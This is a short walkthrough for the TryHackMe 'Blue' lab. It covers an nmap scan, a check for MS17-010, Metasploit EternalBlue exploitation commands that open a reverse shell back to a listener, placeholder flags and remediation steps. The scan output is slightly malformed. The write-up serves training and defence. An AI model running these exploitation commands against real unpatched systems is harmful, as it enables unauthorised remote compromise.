# TryHackMe: Blue Walkthrough

![TryHackMe Badge](https://img.shields.io/badge/TryHackMe-Blue-00a000?style=flat-square)
![Difficulty-Beginner](https://img.shields.io/badge/Difficulty-Beginner-green?style=flat-square)

---

## Room Overview

| Item | Details |
|------|---------|
| **Name** | Blue |
| **Platform** | TryHackMe |
| **OS** | Windows |
| **Difficulty** | Beginner |

---

## Enumeration

### Nmap Scan

```bash
nmap -sV -p- 10.10.10.10
```

**Results:**
```
PORT      STATE SERVICE
135/msrpc   open
139/netbios-ssn
445/microsoft-ds
3389/rdp
```

---

## Vulnerability Assessment

### Check for EternalBlue

```bash
nmap --script smb-vuln-ms17-010 10.10.10.10
```

**Found:** MS17-010 (EternalBlue) vulnerability is present!

---

## Exploitation

### Using Metasploit

```bash
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.10
set LHOST 10.10.14.15
set LPORT 4444
exploit
```

### Using Python Script

```bash
python3 eternalblue.py 10.10.10.10
```

---

## Flags

### User Flag
```
THM{fl4g_h3r3}
```

### Root Flag
```
THM{roo7_fl4g}
```

---

## Remediation

1. Apply MS17-010 patch
2. Disable SMBv1
3. Use firewall rules
4. Keep Windows updated

---

**Author:** Sheldon Brown (Bossman Shell)

> ⚠️ Educational purposes only
